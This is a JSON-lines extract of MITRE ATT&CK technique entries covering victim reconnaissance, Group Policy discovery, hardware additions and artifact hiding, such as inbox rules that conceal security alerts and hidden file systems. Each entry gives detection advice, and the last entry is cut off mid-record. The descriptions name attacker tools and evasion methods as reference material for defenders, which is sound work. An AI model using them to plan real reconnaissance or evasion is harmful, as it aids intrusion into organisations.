{"ID":"T1590","name":"Gather Victim Network Information","description":"Adversaries may gather information about the victim's networks that can be used during targeting. Information about networks may include a variety of details, including administrative data (ex: IP ranges, domain names, etc.) as well as specifics regarding its topology and operations.\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about networks may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).","url":"https://attack.mitre.org/techniques/T1590","created":"02 October 2020","last modified":"15 April 2021","version":"1.0","tactics":"Reconnaissance","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":"PRE","data sources":null,"is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Volexity Exchange Marauder March 2021),"}
{"ID":"T1590.002","name":"Gather Victim Network Information: DNS","description":"Adversaries may gather information about the victim's DNS that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target’s subdomains, mail servers, and other hosts. DNS, MX, TXT, and SPF records may also reveal the use of third party cloud and SaaS providers, such as Office 365, G Suite, Salesforce, or Zendesk.(Citation: Sean Metcalf Twitter DNS Records)\n\nAdversaries may gather this information in various ways, such as querying or otherwise collecting details via [DNS/Passive DNS](https://attack.mitre.org/techniques/T1596/001). DNS information may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596), [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593), or [Active Scanning](https://attack.mitre.org/techniques/T1595)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).","url":"https://attack.mitre.org/techniques/T1590/002","created":"02 October 2020","last modified":"21 October 2022","version":"1.1","tactics":"Reconnaissance","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":"PRE","data sources":null,"is sub-technique":true,"sub-technique of":"T1590","defenses bypassed":null,"contributors":"Jannie Li, Microsoft Threat Intelligence Center (MSTIC)","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1590.001","name":"Gather Victim Network Information: Domain Properties","description":"Adversaries may gather information about the victim's network domain(s) that can be used during targeting. Information about domains and their properties may include a variety of details, including what domain(s) the victim owns as well as administrative data (ex: name, registrar, etc.) and more directly actionable information such as contacts (email addresses and phone numbers), business addresses, and name servers.\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about victim domains and their properties may also be exposed to adversaries via online or other accessible data sets (ex: [WHOIS](https://attack.mitre.org/techniques/T1596/002)).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Where third-party cloud providers are in use, this information may also be exposed through publicly available API endpoints, such as GetUserRealm and autodiscover in Office 365 environments.(Citation: Azure Active Directory Reconnaisance)(Citation: Office 265 Azure Domain Availability) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596), [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593), or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).","url":"https://attack.mitre.org/techniques/T1590/001","created":"02 October 2020","last modified":"21 October 2022","version":"1.1","tactics":"Reconnaissance","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":"PRE","data sources":null,"is sub-technique":true,"sub-technique of":"T1590","defenses bypassed":null,"contributors":"Jannie Li, Microsoft Threat Intelligence Center (MSTIC)","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Azure AD Recon),(Citation: AADInternals Documentation),(Citation: US District Court Indictment GRU Unit 74455 October 2020),"}
{"ID":"T1590.005","name":"Gather Victim Network Information: IP Addresses","description":"Adversaries may gather the victim's IP addresses that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses. Information about assigned IP addresses may include a variety of details, such as which IP addresses are in use. IP addresses may also enable an adversary to derive other details about a victim, such as organizational size, physical location(s), Internet service provider, and or where/how their publicly-facing infrastructure is hosted.\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about assigned IP addresses may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).","url":"https://attack.mitre.org/techniques/T1590/005","created":"02 October 2020","last modified":"15 April 2021","version":"1.0","tactics":"Reconnaissance","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":"PRE","data sources":null,"is sub-technique":true,"sub-technique of":"T1590","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Google Iran Threats October 2021),(Citation: AhnLab Andariel Subgroup of Lazarus June 2018),(Citation: Volexity Exchange Marauder March 2021),"}
{"ID":"T1590.006","name":"Gather Victim Network Information: Network Security Appliances","description":"Adversaries may gather information about the victim's network security appliances that can be used during targeting. Information about network security appliances may include a variety of details, such as the existence and specifics of deployed firewalls, content filters, and proxies/bastion hosts. Adversaries may also target information about victim network-based intrusion detection systems (NIDS) or other appliances related to defensive cybersecurity operations.\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598).(Citation: Nmap Firewalls NIDS) Information about network security appliances may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).","url":"https://attack.mitre.org/techniques/T1590/006","created":"02 October 2020","last modified":"15 April 2021","version":"1.0","tactics":"Reconnaissance","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":"PRE","data sources":null,"is sub-technique":true,"sub-technique of":"T1590","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1590.004","name":"Gather Victim Network Information: Network Topology","description":"Adversaries may gather information about the victim's network topology that can be used during targeting. Information about network topologies may include a variety of details, including the physical and/or logical arrangement of both external-facing and internal network environments. This information may also include specifics regarding network devices (gateways, routers, etc.) and other infrastructure.\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about network topologies may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: DNS Dumpster) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).","url":"https://attack.mitre.org/techniques/T1590/004","created":"02 October 2020","last modified":"15 April 2021","version":"1.0","tactics":"Reconnaissance","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":"PRE","data sources":null,"is sub-technique":true,"sub-technique of":"T1590","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1590.003","name":"Gather Victim Network Information: Network Trust Dependencies","description":"Adversaries may gather information about the victim's network trust dependencies that can be used during targeting. Information about network trusts may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about network trusts may also be exposed to adversaries via online or other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation: Pentesting AD Forests) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).","url":"https://attack.mitre.org/techniques/T1590/003","created":"02 October 2020","last modified":"15 April 2021","version":"1.0","tactics":"Reconnaissance","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":"PRE","data sources":null,"is sub-technique":true,"sub-technique of":"T1590","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1591","name":"Gather Victim Org Information","description":"Adversaries may gather information about the victim's organization that can be used during targeting. Information about an organization may include a variety of details, including the names of divisions/departments, specifics of business operations, as well as the roles and responsibilities of key employees.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about an organization may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak)(Citation: SEC EDGAR Search) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).","url":"https://attack.mitre.org/techniques/T1591","created":"02 October 2020","last modified":"27 August 2021","version":"1.1","tactics":"Reconnaissance","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":"PRE","data sources":null,"is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: KISA Operation Muzabi),(Citation: ClearSky Lazarus Aug 2020),(Citation: Kaspersky ThreatNeedle Feb 2021),"}
{"ID":"T1591.002","name":"Gather Victim Org Information: Business Relationships","description":"Adversaries may gather information about the victim's business relationships that can be used during targeting. Information about an organization’s business relationships may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access. This information may also reveal supply chains and shipment paths for the victim’s hardware and software resources.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about business relationships may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195), [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).","url":"https://attack.mitre.org/techniques/T1591/002","created":"02 October 2020","last modified":"15 April 2021","version":"1.0","tactics":"Reconnaissance","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":"PRE","data sources":null,"is sub-technique":true,"sub-technique of":"T1591","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: MSTIC DEV-0537 Mar 2022),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Gigamon Berserk Bear October 2021),"}
{"ID":"T1591.001","name":"Gather Victim Org Information: Determine Physical Locations","description":"Adversaries may gather the victim's physical location(s) that can be used during targeting. Information about physical locations of a target organization may include a variety of details, including where key resources and infrastructure are housed. Physical locations may also indicate what legal jurisdiction and/or authorities the victim operates within.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Physical locations of a target organization may also be exposed to adversaries via online or other accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594) or [Social Media](https://attack.mitre.org/techniques/T1593/001)).(Citation: ThreatPost Broadvoice Leak)(Citation: SEC EDGAR Search) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Hardware Additions](https://attack.mitre.org/techniques/T1200)).","url":"https://attack.mitre.org/techniques/T1591/001","created":"02 October 2020","last modified":"27 August 2021","version":"1.1","tactics":"Reconnaissance","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":"PRE","data sources":null,"is sub-technique":true,"sub-technique of":"T1591","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Google Iran Threats October 2021),"}
{"ID":"T1591.003","name":"Gather Victim Org Information: Identify Business Tempo","description":"Adversaries may gather information about the victim's business tempo that can be used during targeting. Information about an organization’s business tempo may include a variety of details, including operational hours/days of the week. This information may also reveal times/dates of purchases and shipments of the victim’s hardware and software resources.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about business tempo may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199))","url":"https://attack.mitre.org/techniques/T1591/003","created":"02 October 2020","last modified":"15 April 2021","version":"1.0","tactics":"Reconnaissance","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":"PRE","data sources":null,"is sub-technique":true,"sub-technique of":"T1591","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1591.004","name":"Gather Victim Org Information: Identify Roles","description":"Adversaries may gather information about identities and roles within the victim organization that can be used during targeting. Information about business roles may reveal a variety of targetable details, including identifiable information for key personnel as well as what data/resources they have access to.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about business roles may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: ThreatPost Broadvoice Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).","url":"https://attack.mitre.org/techniques/T1591/004","created":"02 October 2020","last modified":"15 April 2021","version":"1.0","tactics":"Reconnaissance","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":"PRE","data sources":null,"is sub-technique":true,"sub-technique of":"T1591","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: ESET Lazarus Jun 2020),(Citation: ClearSky Siamesekitten August 2021),(Citation: SecureWorks August 2019),(Citation: ClearSky Lazarus Aug 2020),(Citation: MSTIC DEV-0537 Mar 2022),"}
{"ID":"T1615","name":"Group Policy Discovery","description":"Adversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD). Group policy objects (GPOs) are containers for group policy settings made up of files stored within a predictable network path `\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\`.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016)\n\nAdversaries may use commands such as <code>gpresult</code> or various publicly available PowerShell functions, such as <code>Get-DomainGPO</code> and <code>Get-DomainGPOLocalGroup</code>, to gather information on Group Policy settings.(Citation: Microsoft gpresult)(Citation: Github PowerShell Empire) Adversaries may use this information to shape follow-on behaviors, including determining potential attack paths within the target network as well as opportunities to manipulate Group Policy settings (i.e. [Domain Policy Modification](https://attack.mitre.org/techniques/T1484)) for their benefit.","url":"https://attack.mitre.org/techniques/T1615","created":"06 August 2021","last modified":"06 January 2023","version":"1.1","tactics":"Discovery","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor for suspicious use of <code>gpresult</code>. Monitor for the use of PowerShell functions such as <code>Get-DomainGPO</code> and <code>Get-DomainGPOLocalGroup</code> and processes spawning with command-line arguments containing <code>GPOLocalGroup</code>.\n\nMonitor for abnormal LDAP queries with filters for <code>groupPolicyContainer</code> and high volumes of LDAP traffic to domain controllers. Windows Event ID 4661 can also be used to detect when a directory service has been accessed.","platforms":"Windows","data sources":"Active Directory: Active Directory Object Access, Command: Command Execution, Network Traffic: Network Traffic Content, Process: Process Creation, Script: Script Execution","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Jonhnathan Ribeiro, 3CORESec, @_w0rk3r; Ted Samuels, Rapid7","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Emissary Trojan Feb 2016),(Citation: ESET ComRAT May 2020),(Citation: Github PowerShell Empire),(Citation: GitHub Bloodhound),"}
{"ID":"T1200","name":"Hardware Additions","description":"Adversaries may introduce computer accessories, networking hardware, or other computing devices into a system or network that can be used as a vector to gain access. Rather than just connecting and distributing payloads via removable storage (i.e. [Replication Through Removable Media](https://attack.mitre.org/techniques/T1091)), more robust hardware additions can be used to introduce new functionalities and/or features into a system that can then be abused.\n\nWhile public references of usage by threat actors are scarce, many red teams/penetration testers leverage hardware additions for initial access. Commercial and open source products can be leveraged with capabilities such as passive network tapping, network traffic modification (i.e. [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)), keystroke injection, kernel memory reading via DMA, addition of new wireless access to an existing network, and others.(Citation: Ossmann Star Feb 2011)(Citation: Aleks Weapons Nov 2015)(Citation: Frisk DMA August 2016)(Citation: McMillan Pwn March 2012)","url":"https://attack.mitre.org/techniques/T1200","created":"18 April 2018","last modified":"30 March 2023","version":"1.6","tactics":"Initial Access","detection":"Asset management systems may help with the detection of computer systems or network devices that should not exist on a network. \n\nEndpoint sensors may be able to detect the addition of hardware via USB, Thunderbolt, and other external device communication ports.","platforms":"Linux, Windows, macOS","data sources":"Application Log: Application Log Content, Drive: Drive Creation, Network Traffic: Network Traffic Flow","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Securelist DarkVishnya Dec 2018),(Citation: Wikipedia 802.1x)"}
{"ID":"T1564","name":"Hide Artifacts","description":"Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Operating systems may have features to hide various artifacts, such as important system files and administrative task execution, to avoid disrupting user work environments and prevent users from changing files or features on the system. Adversaries may abuse these features to hide artifacts such as files, directories, user accounts, or other system activity to evade detection.(Citation: Sofacy Komplex Trojan)(Citation: Cybereason OSX Pirrit)(Citation: MalwareBytes ADS July 2015)\n\nAdversaries may also attempt to hide artifacts associated with malicious behavior by creating computing regions that are isolated from common security instrumentation, such as through the use of virtualization technology.(Citation: Sophos Ragnar May 2020)","url":"https://attack.mitre.org/techniques/T1564","created":"26 February 2020","last modified":"25 March 2022","version":"1.1","tactics":"Defense Evasion","detection":"Monitor files, processes, and command-line arguments for actions indicative of hidden artifacts. Monitor event and authentication logs for records of hidden artifacts being used. Monitor the file system and shell commands for hidden attribute usage.","platforms":"Linux, Office 365, Windows, macOS","data sources":"Application Log: Application Log Content, Command: Command Execution, File: File Creation, File: File Metadata, File: File Modification, Firmware: Firmware Modification, Process: OS API Execution, Process: Process Creation, Script: Script Execution, Service: Service Creation, User Account: User Account Creation, User Account: User Account Metadata, Windows Registry: Windows Registry Key Modification","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Check Point Warzone Feb 2020),(Citation: sentinelone shlayer to zshlayer),(Citation: Secureworks DarkTortilla Aug 2022),(Citation: 20 macOS Common Tools and Techniques),(Citation: Shlayer jamf gatekeeper bypass 2021),(Citation: Tarrask scheduled task),"}
{"ID":"T1564.008","name":"Hide Artifacts: Email Hiding Rules","description":"Adversaries may use email rules to hide inbound emails in a compromised user's mailbox. Many email clients allow users to create inbox rules for various email functions, including moving emails to other folders, marking emails as read, or deleting emails. Rules may be created or modified within email clients or through external features such as the <code>New-InboxRule</code> or <code>Set-InboxRule</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets on Windows systems.(Citation: Microsoft Inbox Rules)(Citation: MacOS Email Rules)(Citation: Microsoft New-InboxRule)(Citation: Microsoft Set-InboxRule)\n\nAdversaries may utilize email rules within a compromised user's mailbox to delete and/or move emails to less noticeable folders. Adversaries may do this to hide security alerts, C2 communication, or responses to [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) emails sent from the compromised account.\n\nAny user or administrator within the organization (or adversary with valid credentials) may be able to create rules to automatically move or delete emails. These rules can be abused to impair/delay detection had the email content been immediately seen by a user or defender. Malicious rules commonly filter out emails based on key words (such as <code>malware</code>, <code>suspicious</code>, <code>phish</code>, and <code>hack</code>) found in message bodies and subject lines. (Citation: Microsoft Cloud App Security)\n\nIn some environments, administrators may be able to enable email rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions.(Citation: Microsoft Mail Flow Rules 2023) Adversaries that abuse such features may be able to automatically modify or delete all emails related to specific topics (such as internal security incident notifications).","url":"https://attack.mitre.org/techniques/T1564/008","created":"07 June 2021","last modified":"12 April 2023","version":"1.2","tactics":"Defense Evasion","detection":"Monitor email clients and applications for suspicious activity, such as missing messages or abnormal configuration and/or log entries.\n\nOn Windows systems, monitor for creation of suspicious inbox rules through the use of the <code>New-InboxRule</code> and <code>Set-InboxRule</code> PowerShell cmdlets.(Citation: Microsoft BEC Campaign) On MacOS systems, monitor for modifications to the <code>RulesActiveState.plist</code>, <code>SyncedRules.plist</code>, <code>UnsyncedRules.plist</code>, and <code>MessageRules.plist</code> files.(Citation: MacOS Email Rules)","platforms":"Google Workspace, Linux, Office 365, Windows, macOS","data sources":"Application Log: Application Log Content, Command: Command Execution, File: File Modification","is sub-technique":true,"sub-technique of":"T1564","defenses bypassed":null,"contributors":"Dor Edry, Microsoft; Liran Ravich, CardinalOps","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: FireEye Hacking FIN4 Dec 2014),(Citation: Microsoft Get-InboxRule),(Citation: Microsoft Manage Mail Flow Rules 2023)"}
{"ID":"T1564.005","name":"Hide Artifacts: Hidden File System","description":"Adversaries may use a hidden file system to conceal malicious activity from users and security tools. File systems provide a structure to store and access data from physical storage. Typically, a user engages with a file system through applications that allow them to access files and directories, which are an abstraction from their physical location (ex: disk sector). Standard file systems include FAT, NTFS, ext4, and APFS. File systems can also contain other structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in NTFS.(Citation: MalwareTech VFS Nov 2014)\n\nAdversaries may use their own abstracted file system, separate from the standard file system present on the infected system. In doing so, adversaries can hide the presence of malicious components and file input/output from security tools. Hidden file systems, sometimes referred to as virtual file systems, can be implemented in numerous ways. One implementation would be to store a file system in reserved disk space unused by disk structures or standard file system partitions.(Citation: MalwareTech VFS Nov 2014)(Citation: FireEye Bootkits) Another implementation could be for an adversary to drop their own portable partition image as a file on top of the standard file system.(Citation: ESET ComRAT May 2020) Adversaries may also fragment files across the existing file system structure in non-standard ways.(Citation: Kaspersky Equation QA)","url":"https://attack.mitre.org/techniques/T1564/005","created":"28 June 2020","last modified":"29 June 2020","version":"1.0","tactics":"Defense Evasion","detection":"Detecting the use of a hidden file system may be exceptionally difficult depending on the implementation. Emphasis may be placed on detecting related aspects of the adversary lifecycle, such as how malware interacts with the hidden file system or how a hidden file system is loaded. Consider looking for anomalous interactions with the Registry or with a particular file on disk. Likewise, if the hidden file system is loaded on boot from reserved disk space, consider shifting focus to detecting [Bootkit](https://attack.mitre.org/techniques/T1542/003) activity.","platforms":"Linux, Windows, macOS","data sources":"File: File Modification, Firmware: Firmware Modification, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1564","defenses bypassed":null,"contributors":null,"permissions required":"Administrator, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship 